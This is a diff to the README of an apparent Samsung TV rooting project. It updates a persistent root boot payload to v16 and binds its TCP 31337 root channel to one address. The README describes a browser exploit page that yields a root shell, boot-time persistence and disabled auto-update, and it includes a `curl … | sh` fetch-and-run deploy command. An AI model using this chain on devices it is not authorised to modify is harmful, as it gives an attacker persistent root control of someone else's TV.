@@ -35,8 +35,8 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | v15, 23,040 B, md5 `bf0c0342437c236c20ecaa0a8ee3bf4c` (`server/payload.dll`, source `payload/`; host-independent) |
-| Boot-to-root | ~40 s typical; v15 cold boot: round 0 fast-failed, round 1 rooted (channel back ~33 s after the first probe); v14 measured 53 s from a forced reboot |
+| Payload | v16, 24,064 B, md5 `ef8721881df2903f36371aaa482eed9f` (`server/payload.dll`, source `payload/`; host-independent) |
+| Boot-to-root | ~40 s typical; v16 cold boot rooted at 21:48:45 with `bind=192.168.178.175` (channel up at the first probe, +7 s); v14 measured 53 s from a forced reboot |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
 | Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |
@@ -70,14 +70,22 @@ flow. The sequence of changes that got here is in `CHANGELOG.md`.
 browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
 `server/recover.sh` from that shell to reinstall the payload.
 
-Payload lineage (v5 → v15, and what each version fixed) is in `CHANGELOG.md`; the label
+Payload lineage (v5 → v16, and what each version fixed) is in `CHANGELOG.md`; the label
 regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.
 
-### Channel hardening (v14, extended in v15)
+### Channel hardening (v14, extended in v15/v16)
 
 The app must still be able to prove root "with no PC", so nothing on the boot path
 may block on the network:
 
+- **31337 binds one address (v16).** The listener binds the TV's OWN address,
+  derived at runtime from the route to the recorded PC (a UDP `connect` that sends
+  nothing) — never a hardcoded IP, so another person's laptop needs no change.
+  That keeps it off Wi-Fi Direct/tethering, which a wildcard listener was reachable
+  from. It is re-derived every 30 s and the listener rebound if the address moves
+  (`Pending()` polling makes that possible); with no route yet (TV offline) it
+  falls back to `Any` and beacons `chan bind … failed`, because a working channel
+  beats a closed port. `PeerAllowed` still filters the peer.
 - **Cred writes are ours-only (v15).** `PatchCred` refuses any cred whose uid is
   not 5001, so a bogus `real_parent`/`parent` that happens to point at init's
   cred (uid 0) is never written; a uid-0 cred counts as "already done". This is
@@ -99,7 +107,7 @@ may block on the network:
 ### Auto-update is pinned off
 
 The TV would happily replace the app the payload lives in. The payload therefore
-re-asserts the menu setting at every boot (v13, unchanged in v15) and logs the readback
+re-asserts the menu setting at every boot (v13, unchanged in v16) and logs the readback
 (`DSHROOT autoupdate … = Int32: 0`):
 
 ```sh
@@ -200,7 +208,7 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
 | `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
 | `tools/tv_ws_launch.py` | Samsung remote-control WebSocket diagnostic/launcher (refused on this unit) |
-| `payload/Program.cs` | boot payload source (v15) |
+| `payload/Program.cs` | boot payload source (v16) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -284,7 +292,7 @@ shell - that corrupts the stream and wastes the page load.
 
 `server/payload.dll` is committed **deliberately** — it is the artifact the TV
 fetches during deploy, and it is byte-identical to the build output
-`payload/out/MultiControlService.dll` (md5 `bf0c0342…`, v15), so the repo runs
+`payload/out/MultiControlService.dll` (md5 `ef872188…`, v16), so the repo runs
 without a .NET SDK. Rebuild with `dotnet build payload/BootPayload.csproj -c
 Release`, then update the `WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.
 
@@ -327,7 +335,7 @@ python run_root.py "id" 6               # uid=0(root)
 
 # 4. deploy the boot payload
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=23040, MD5=bf0c0342..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE=24064, MD5=ef872188..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 #    (deploy.sh now exits 1 on a label/boot-row/AUL failure instead of warning)
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
@@ -346,7 +354,7 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `bf0c0342…`.
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `ef872188…`.
 - [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
 - [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.
 - [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
@@ -437,10 +445,7 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 
 ## 11. Open work
 
-- Bind 31337 to a single address instead of `0.0.0.0`. Partly mitigated in v7:
-  the payload checks the peer IP against `rootchan.allow` (one address, written
-  by `deploy.sh`), so only that host is served — but the socket still listens on
-  all interfaces.
+- ~~Bind 31337 to a single address~~ — **done in v16**: the listener binds the TV address derived from the route to the recorded PC (re-derived every 30 s, `Any` fallback with a beacon if there is no route), so it is off Wi-Fi Direct/tethering while staying portable. Live: `/proc/net/tcp` shows `AFB2A8C0:7A69` (192.168.178.175:31337), not `00000000:7A69`.
 - ~~Clamp the stub's client-controlled lengths~~ — **done**: `physrpc.S` bounds
   READ/WRITE32/READMANY/RUN/FILE, refuses with -EINVAL, and ends the stub for the
   two ops whose payload would desync the stream; blob rebuilt (7552 B), page
